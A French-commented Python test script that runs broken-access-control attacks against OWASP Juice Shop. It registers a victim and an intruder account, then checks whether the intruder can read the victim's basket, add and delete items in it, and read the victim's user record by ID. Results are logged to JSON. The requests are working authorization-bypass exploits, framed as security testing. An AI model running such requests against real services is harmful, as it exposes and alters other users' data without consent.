"""Banc multi-attaques sur Juice Shop (cible vulnérable de l'équipe) — plusieurs schémas du playbook.
Portée STRICTE : accès d'un utilisateur aux données d'un autre (BAC multi-tenant). Écritures remises en l'état.
Usage : python juiceshop_attaques.py <url_juiceshop>
"""
import base64, datetime as dt, json, secrets, sys

import httpx


def H(t):
    return {"Authorization": "Bearer " + t}


def _id_du_jwt(token):
    """L'id utilisateur est dans la charge utile du JWT (data.id)."""
    try:
        p = token.split(".")[1]
        p += "=" * (-len(p) % 4)
        return json.loads(base64.urlsafe_b64decode(p)).get("data", {}).get("id")
    except Exception:
        return None


def compte(base, email, mdp):
    httpx.post(base + "/api/Users", timeout=30,
               json={"email": email, "password": mdp, "passwordRepeat": mdp,
                     "securityQuestion": {"id": 2}, "securityAnswer": "test"})
    a = httpx.post(base + "/rest/user/login", timeout=30, json={"email": email, "password": mdp}).json()["authentication"]
    return {"token": a["token"], "bid": a["bid"], "email": a["umail"], "id": _id_du_jwt(a["token"])}


def main(base):
    base = base.rstrip("/")
    tag = dt.datetime.now().strftime("%H%M%S")
    A = compte(base, f"victime-{tag}@juice.test", "JsTest!" + secrets.token_hex(5))
    B = compte(base, f"intrus-{tag}@juice.test", "JsTest!" + secrets.token_hex(5))
    print(f"Victime A : {A['email']} (id {A['id']}, panier #{A['bid']})")
    print(f"Intrus  B : {B['email']} (id {B['id']}, panier #{B['bid']})\n")
    res = []

    # A prépare son panier
    httpx.post(base + "/api/BasketItems", timeout=30, headers=H(A["token"]),
               json={"BasketId": A["bid"], "ProductId": 1, "quantity": 2})

    # --- P1/P7 : B LIT le panier de A ---
    r = httpx.get(base + f"/rest/basket/{A['bid']}", timeout=30, headers=H(B["token"]))
    vus = [p.get("name") for p in r.json().get("data", {}).get("Products", [])] if r.status_code == 200 else []
    res.append(("P1/P7 — B lit le panier de A", r.status_code, "FUITE" if vus else "protégé", str(vus)[:60]))

    # --- P3 : B ÉCRIT dans le panier de A (ajoute un article), puis remise en l'état ---
    w = httpx.post(base + "/api/BasketItems", timeout=30, headers=H(B["token"]),
                   json={"BasketId": A["bid"], "ProductId": 6, "quantity": 1})
    ecrit = w.status_code in (200, 201)
    item_id = (w.json().get("data", {}) or {}).get("id") if ecrit else None
    # vérifier côté A
    pa = httpx.get(base + f"/rest/basket/{A['bid']}", timeout=30, headers=H(A["token"]))
    noms_a = [p.get("name") for p in pa.json().get("data", {}).get("Products", [])] if pa.status_code == 200 else []
    injecte = any("Banana" in (n or "") or len(noms_a) > 1 for n in noms_a)
    res.append(("P3 — B écrit dans le panier de A", w.status_code, "FUITE" if ecrit and injecte else "protégé", str(noms_a)[:60]))
    # remise en l'état : supprimer l'article injecté
    if item_id:
        httpx.delete(base + f"/api/BasketItems/{item_id}", timeout=30, headers=H(B["token"]))

    # --- P1 : B LIT le compte utilisateur de A ---
    u = httpx.get(base + f"/api/Users/{A['id']}", timeout=30, headers=H(B["token"]))
    data = u.json().get("data", {}) if u.status_code == 200 else {}
    fuite_u = data.get("email") == A["email"]
    res.append(("P1 — B lit le compte de A (/api/Users/{id})", u.status_code, "FUITE" if fuite_u else "protégé", str(data.get("email"))[:60]))

    print(f"{'ATTAQUE':<44}{'HTTP':>6}{'VERDICT':>10}   détail")
    for nom, http, verdict, det in res:
        print(f"{nom:<44}{http:>6}{verdict:>10}   {det}")
    nb = sum(1 for _, _, v, _ in res if v == "FUITE")
    print(f"\n==> {nb} faille(s) prouvée(s) sur {len(res)} testée(s). Panier de A remis en l'état.")
    out = {"cible": base, "date": dt.datetime.now().isoformat(timespec="seconds"),
           "resultats": [{"attaque": n, "http": h, "verdict": v, "detail": d} for n, h, v, d in res]}
    import pathlib
    f = pathlib.Path("resultats") / f"juiceshop_attaques_{tag}.json"
    f.write_text(json.dumps(out, indent=2, ensure_ascii=False), encoding="utf-8")
    print(f"→ {f.name}")


if __name__ == "__main__":
    main(sys.argv[1])
